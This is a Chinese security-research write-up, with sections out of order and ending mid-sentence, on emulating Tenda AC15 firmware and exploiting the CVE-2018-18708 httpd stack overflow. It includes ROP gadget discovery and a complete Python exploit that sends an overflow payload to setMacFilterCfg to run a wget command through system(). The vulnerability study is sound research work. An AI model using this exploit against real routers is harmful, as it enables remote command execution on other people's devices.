
其次，需要找到一个可以控制`R0`的`gadget`

```YAML
#gadget2
sudo pip3 install ropgadget
ROPgadget --binary ./lib/libc.so.0 | grep "mov r0, sp"
0x00040cb8 : mov r0, sp ; blx r3
```

可以看到，在控制`R0`之后，这条指令跳转到`R3`，因此，我们可以再找一条控制`R3`的`gadget`

```YAML
#gadget1
ROPgadget --binary ./lib/libc.so.0 --only "pop"| grep r3
0x00018298 : pop {r3, pc}
```

这样就组成了`payload`：`padding` + `gadget1` + `system_addr` + `gadget2` + `cmd`

`padding`将函数溢出后覆盖返回地址为`gadget1`，`gadget1`将`system_addr`弹出到`R3`，将`gadget2`的地址弹出到`pc`执行`gadget2`，`gadget2`将此时栈顶的`cmd`参数弹出到`R0`，接着跳转到`R3`执行`system`函数。

完整的`exp`如下：

```YAML
import requests
from pwn import *
cmd="wget 192.168.11.35"
libc_base = 0xff58c000
system = libc_base + 0x5A270
mov_r0_ret_r3 = libc_base + 0x40cb8
pop_r3 = libc_base + 0x18298
payload = 'a'*176
payload+= p32(pop_r3) + p32(system) + p32(mov_r0_ret_r3) + cmd
url = "http://192.168.2.3/goform/setMacFilterCfg"
cookie = {"Cookie":"password=12345"}
data = {"macFilterType": "black", "deviceList": "\r" + payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```

可能是`qemu-user`模拟的原因，直接启动的话无法看到`system`函数的执行，**需要加上`-strace`才能看到被执行！**

![图片描述](upload/attach/202211/945201_3UHUV4E8HXZGXWH.png)

## 5.总结

本文重点分析了模拟环境时的`patch`过程，以及如何逆向分析网络问题。针对`tenda`路由器模拟的一个共性问题：需要新建一个`br0`网卡，进行了逆向分析找到了原因，对路由器网络服务启动的流程有了一个更清晰的认识。

另外，对`qemu-user + gdb`调试的方式有了更深体会。相比于系统模拟，用户模拟启动更快速更方便，不需要配置`qemu`虚拟机和宿主机的网络连接。但是会存在一些不能查看内存信息，执行命令不能显示等奇奇怪怪的问题。总的来说，两种方式各有优劣，在之后的调试过程中可以按需选择。

最后，实践体会了逆向数据流跟踪的思路与方法。

## 6.参考

<a href="elink@fb8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1H3y4o6b7H3x3#2)9J5x3$3R3J5i4K6u0V1x3l9`.`."><mark class="encrypted">b03K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1H3y4o6b7H3x3#2)9J5x3$3R3J5i4K6u0V1x3l9`.`.</mark></a>

[https://bbs.pediy.com/thread-273921.htm](https://bbs.pediy.com/thread-273921.htm)

分析了一部分`tenda`的漏洞，发现存在一系列相似的栈溢出的漏洞，如`CVE-2018-5767`、`CVE-2018-18708`、`CVE-2018-16333`以及`CVE-2020-13392`等。这些漏洞的固件模拟流程一致，利用思路一致。但是仔细深入分析，会发现每个漏洞的的崩溃路径并不一致，在复现时都需要深入分析其函数调用链，确定漏洞触发路径。以`CVE-2018-18708`为例，本文重点学习此类固件模拟的流程以及逆向数据流跟踪的思路与方法。

## 1.漏洞概述

`CVE-2018-18708`，多款`Tenda`产品中的`httpd`存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（覆盖函数的返回地址）。以下产品和版本受到影响：`Tenda AC7 V15.03.06.44_CN`版本；`AC9 V15.03.05.19(6318)_CN`版本；`AC10 V15.03.06.23_CN`版本；`AC15 V15.03.05.19_CN`版本；`AC18 V15.03.05.19(6318)_CN`版本。

下载固件：[bb9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8%4N6F1i4K6u0W2N6r3g2F1k6r3q4Q4x3X3g2U0L8$3#2Q4x3X3g2U0L8W2)9J5c8Y4g2H3L8r3!0S2k6r3k6A6L8r3g2Q4x3V1k6m8b7K6p5#2i4K6u0r3g2g2y4Q4y4h3k6m8b7K6p5#2g2U0q4Q4x3X3f1H3b7W2u0Q4y4h3k6h3x3e0g2Q4x3X3f1H3x3#2)9J5k6e0l9#2i4K6u0W2x3e0W2Q4y4h3k6E0N6h3I4@1K9g2)9#2k6W2c8p5x3o6q4Q4x3X3g2*7K9i4l9`.](https://bbs.kanxue.com/elink@240K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8%4N6F1i4K6u0W2N6r3g2F1k6r3q4Q4x3X3g2U0L8$3#2Q4x3X3g2U0L8W2)9J5c8Y4g2H3L8r3!0S2k6r3k6A6L8r3g2Q4x3V1k6m8b7K6p5#2i4K6u0r3g2g2y4Q4y4h3k6m8b7K6p5#2g2U0q4Q4x3X3f1H3b7W2u0Q4y4h3k6h3x3e0g2Q4x3X3f1H3x3#2)9J5k6e0l9#2i4K6u0W2x3e0W2Q4y4h3k6E0N6h3I4@1K9g2)9#2k6W2c8p5x3o6q4Q4x3X3g2*7K9i4l9`.)

## 2.固件模拟

`binwalk`解压固件

|  |  |
| --- | --- |
| 1  2  3  4  5 | `binwalk` `-Me US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin`  `cd ./_US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/` `squashfs-root`    `#运行可执行文件`  `sudo chroot . ./qemu-arm-static ./bin/httpd` |

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_9MPET958ASVFMQ4.png)

卡在启动界面，`IDA`分析原因，根据字符串”`Welcome to ...`“来到`main`函数

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_W5Q83RCV7MUBBFY.png)

发现存在两个检查，第一个检查`network`，未通过则进入休眠阶段。第二个检查连接情况，未通过则打印连接失败

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_NYAWAZ3SBFCARAZ.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_NN9VBGKEFXTEEBF.png)

所以想让服务正常启动，需要对这两处检查进行`patch`

这里推荐一个`IDA`插件：`keypatch`

[45cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6C8k6i4W2K6N6r3!0F1k6g2)9J5k6r3g2F1k6$3W2F1k6g2)9J5c8X3E0W2P5i4m8S2N6r3y4Z5](https://bbs.kanxue.com/elink@6f9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6C8k6i4W2K6N6r3!0F1k6g2)9J5k6r3g2F1k6$3W2F1k6g2)9J5c8X3E0W2P5i4m8S2N6r3y4Z5)

按需求对二进制文件进行`patch`，修改后点`edit->patch program`

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_F5VE7UZTZN9DQRC.png)

具体`patch`过程如下：

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_XNF45XXKBGU2CK2.png)

### 分析并修复网络环境

`patch`完继续执行二进制文件，发现`ip`地址不对

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_FJV8T53GG8DTPNU.png)

进一步`IDA`查看`ip`地址如何得到的，通过字符串“`listen ip`”定位到`sub_1B84C`函数

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_PFN58RMEU8VURR3.png)

下断点，`gdb`分析`sub_1B84C`函数的调用链

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8 | `#qemu启动httpd程序目，并开启调试端口`  `sudo chroot . ./qemu-arm-static -g 1234 ./bin/httpd`    `#另起终端，gdb-mul连接`  `gdb-multiarch`  `set architecture arm`  `b *0x1B84C`  `target remote :1234` |

`bt`（`backtrace`）查看函数`sub_1B84C`的调用栈，结合`IDA`可以确定`sub_29818`调用了`sub_1B84C`

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_8W9VMYY87MRWBQ2.png)

重复上述步骤，可以得到调用链为：`sub_2E420`（`main`函数）-> `sub_2E9EC`(`initWebs`函数) -> `sub_29510` -> `sub_29818` -> `sub_1B84C`

接下来分析`printf`的`ip`参数`v8`进行跟踪：`v8`关联到`s.sa_data[2]`，`s.sa_data[2]`关联到`a1`，`a2`

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_VBGXPJ5AHCA8D3X.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_WUP9VJ5CVE23SMV.png)

`a1`关联到`g_lan_ip`函数，最终回溯到主函数中

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_EP6PH2U9ZNKKM7X.png)

可以看到`ip`的值与`s`和`v17`有关

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_2M2432V7G3R65AT.png)

此处我们进行详细分析，根据函数名猜测`getIfIp`的作用的是获取`ip`地址，进入函数查看具体实现。

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_WSTGPRNP96PJE66.png)

`getIfIp`为外部导入函数，对函数名进行搜索，查找存在的动态链接库

|  |  |
| --- | --- |
| 1  2  3  4 | `#查看可执行程序需要的动态链接库`  `readelf -d ./bin/httpd | grep NEEDED`  `#列出所有的函数名，与要寻找的函数对比`  `nm -D ./lib/libcommon.so` |

发现`getIfIp`函数的本体存在于`libcommon.so` 中

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_5U8A925AYAETY46.png)

大致分析伪代码，可以看到一个系统调用`ioctl(fd, 0x8915u, dest)`，查看这个系统调用所实现的功能

一般来讲`ioctl`在用户程序中的调用是：

`ioctl(int fd,int command, (char*)argstruct)`

`ioctl`调用与网络编程有关，文件描述符`fd`实际上是由`socket()`系统调用返回的。参数`command`的取值由`/usr/include/linux/sockios.h` 所规定。第三个参数是`ifreq`结构，在`/usr /include/linux/if.h`中定义。

参考：[019K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3P5Y4S2U0x3X3#2S2L8W2)9J5c8Y4m8Q4x3V1j5&6y4e0p5I4z5o6f1$3i4K6u0W2K9s2c8E0L8l9`.`.](https://bbs.kanxue.com/elink@f58K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3P5Y4S2U0x3X3#2S2L8W2)9J5c8Y4m8Q4x3V1j5&6y4e0p5I4z5o6f1$3i4K6u0W2K9s2c8E0L8l9`.`.)

到头文件中查看，可以发现，第二个参数实现的功能正是获取`IP地址`

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_4EQ4ZKMS7B2N4WU.png)

第三个参数的含义需要进一步分析，先看函数整体的流程，应该就是成功获取`ip`地址返回`v2`，`v2`的值为`0`在`main`函数就不会进入`if`循环，而`ip`地址的值则由`v17`决定。进一步跟进`v17`，就是在`getIfIp`函数中的`a2`，由系统调用获取`ip`地址后赋给`a2`即`main`函数中的`v17`。那么想让函数按我们分析的执行，还需要分析第三个参数的含义。第三个参数与`main`函数的`v6`有关，进一步分析，与`getLanIfName`函数有关，依照上面的步骤发现`getLanIfName`函数依然存在于`libcommon.so`中，查看函数的本体。

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_FCYASQW7Y7SQNDC.png)

`getLanIfName`函数进一步关联到`get_eth_name`函数，且参数写死为`0`。依照上面的步骤发现`get_eth_name`函数依然存在于`libChipApi.so`中，查看函数的本体，函数返回`v1`，即网卡的名称，上述系统调用的第三个参数也就清楚了。

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_PR7M3U2KK37PRX6.png)

至此，我们可以梳理一下整个流程。在`main`函数中，首先调用`getLanIfName`函数进而调用`get_eth_name`函数获取网卡名称。然后将网卡名称作为参数输入到`getIfIp`中，函数功能为寻找网卡名称为`br0`的`ip`地址并传递给`V17`。

所以，想让二进制程序监听正确的`ip`地址需要新建一个名为`br0`的网卡。

|  |  |
| --- | --- |
| 1  2 | `sudo brctl addbr br0`  `sudo ifconfig br0 192.168.2.3/24` |

重新启动，找到了名为`br0`的网卡并获取了`ip`地址：

![图片描述](https://bbs.kanxue.com/upload/attach/202211/945201_7R48CH8DV7M3BH8.png)

尝试访问`web`页面，还是存在错误：
